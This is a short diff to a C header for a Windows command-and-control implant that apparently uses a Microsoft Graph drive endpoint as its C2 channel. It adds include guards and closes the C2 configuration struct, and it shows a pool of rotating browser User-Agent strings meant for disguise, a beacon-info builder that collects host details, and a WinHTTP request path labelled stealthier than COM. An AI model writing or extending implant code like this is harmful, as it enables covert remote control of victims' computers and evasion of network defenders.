@@ -1,3 +1,6 @@
+#ifndef GDRIVE_C2_H
+#define GDRIVE_C2_H
+
 #include <windows.h>
 #include <winhttp.h>
 #include <stdint.h>
@@ -33,6 +36,8 @@ static C2_CONFIG g_C2 = {
     L"https://graph.microsoft.com/v1.0/me/drive/root/children",
     0,
     C2_INITIAL_BACKOFF
+};
+
 // Pool de User-Agents para rotación (ofuscados o reales)
 static const wchar_t* USER_AGENTS_POOL[] = {
     L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
@@ -112,10 +117,6 @@ static void BuildBeaconInfo(char *buf, DWORD bufSize) {
     for (int i = 0; arch[i] && pos < (int)bufSize - 1; i++) buf[pos++] = arch[i];
     buf[pos] = '\0';
 }
-
-// =============================================================================
-// COM-BASED HTTP REQUEST WITH PROPER CLEANUP
-// =============================================================================
 
 // =============================================================================
 // WINHTTP-BASED HTTP REQUEST (Stealthier than COM)
